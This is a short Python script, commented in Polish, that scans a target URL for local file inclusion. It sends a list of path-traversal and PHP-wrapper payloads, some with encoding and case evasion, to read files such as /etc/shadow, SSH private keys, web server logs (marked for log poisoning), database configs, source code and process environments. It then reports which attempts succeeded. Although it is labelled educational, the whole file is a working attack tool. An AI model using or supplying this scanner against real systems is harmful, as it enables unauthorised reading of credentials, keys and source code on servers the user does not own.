#!/usr/bin/env python3
import requests
import urllib3
import argparse

# Wyłączamy ostrzeżenia o braku certyfikatów, jeśli testujesz po HTTPS
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- KONFIGURACJA ARGUMENTÓW TERMINALA ---
parser = argparse.ArgumentParser(description="Edukacyjny Skaner LFI (Local File Inclusion)")
parser.add_argument("-u", "--url", required=True, help="Docelowy adres URL (zakończony parametrem, np. http://ip/page.php?file=)")
parser.add_argument("-p", "--prefix", default="", help="Opcjonalny prefiks (np. nazwa katalogu bazowego przed payloadem)")

args = parser.parse_args()

BASE_URL = args.url
PREFIX = args.prefix

payloads = [
    # --- 1. LINUX KRYTYCZNE ---
    "file:///etc/passwd",
    "../../../../../../../../etc/passwd",
    "../../../../../../../../etc/shadow",
    "../../../../../../../../root/.ssh/id_rsa",
    "../../../../../../../../home/user/.ssh/id_rsa",
    "../../../../../../../../etc/issue",
    
    # --- 2. WINDOWS KRYTYCZNE ---
    "c:/windows/win.ini",
    "c:/windows/system32/drivers/etc/hosts",
    "c:/boot.ini",
    "../../../../../../../../windows/win.ini",
    "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "%WINDIR%\\win.ini",
    
    # --- 3. APACHE & NGINX (Log Poisoning) ---
    "../../../../../../../../var/log/apache2/access.log",
    "../../../../../../../../var/log/httpd/access.log",
    "../../../../../../../../var/log/nginx/access.log",
    "../../../../../../../../etc/apache2/apache2.conf",
    "c:/xampp/apache/logs/access.log",
    
    # --- 4. MYSQL & BAZY DANYCH ---
    "../../../../../../../../etc/mysql/my.cnf",
    "../../../../../../../../var/log/mysql/error.log",
    "c:/xampp/mysql/bin/my.ini",

    # --- 5. PHP WRAPPERS & EVASION ---
    "php://filter/convert.base64-encode/resource=preview.php",
    "php://filter/read=string.rot13/resource=preview.php",
    "fIlE:///etc/passwd",
    "....//....//....//....//etc/passwd",
    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    
    # --- 6. ŚRODOWISKO I PROCESY ---
    "../../../../../../../../proc/self/environ",
    "../../../../../../../../proc/self/cmdline"
]

print(f"[*] Rozpoczynam skanowanie LFI dla celu: {BASE_URL}")
if PREFIX:
    print(f"[*] Używam prefiksu: {PREFIX}")

for payload in payloads:
    full_target = BASE_URL + PREFIX + payload
    print(f"[*] Testuję: {payload:<50}", end="\r")
    
    try:
        response = requests.get(full_target, timeout=5, verify=False)
        text = response.text
        
        # --- WERYFIKACJA SUKCESU ---
        if "root:x:0:0" in text:
            print(f"\n[+] SUKCES (Linux /etc/passwd)! Wektor: {payload}")
        elif "root:$" in text or "root:!" in text:
            print(f"\n[+] BINGO! (Linux /etc/shadow)! Wektor: {payload}")
        elif "BEGIN RSA PRIVATE KEY" in text or "BEGIN OPENSSH PRIVATE KEY" in text:
            print(f"\n[+] BINGO! (Klucz SSH odczytany)! Wektor: {payload}")
        elif "[extensions]" in text or "for 16-bit app support" in text:
            print(f"\n[+] SUKCES (Windows win.ini)! Wektor: {payload}")
        elif "HTTP/1.1" in text and ("GET" in text or "POST" in text):
            print(f"\n[+] SUKCES (Logi WWW - Szansa na Log Poisoning)! Wektor: {payload}")
        elif "[mysqld]" in text or "mysql_user" in text:
            print(f"\n[+] SUKCES (Konfiguracja MySQL)! Wektor: {payload}")
        elif "PD9wa" in text:
            print(f"\n[+] SUKCES (Odczytano kod w Base64)! Wektor: {payload}")
        elif "HTTP_USER_AGENT" in text or "DOCUMENT_ROOT" in text:
            print(f"\n[+] SUKCES (Odczytano /proc/self/environ)! Wektor: {payload}")
             
    except requests.exceptions.RequestException as e:
        pass 

print("\n[+] Skanowanie zakończone.                                        ")
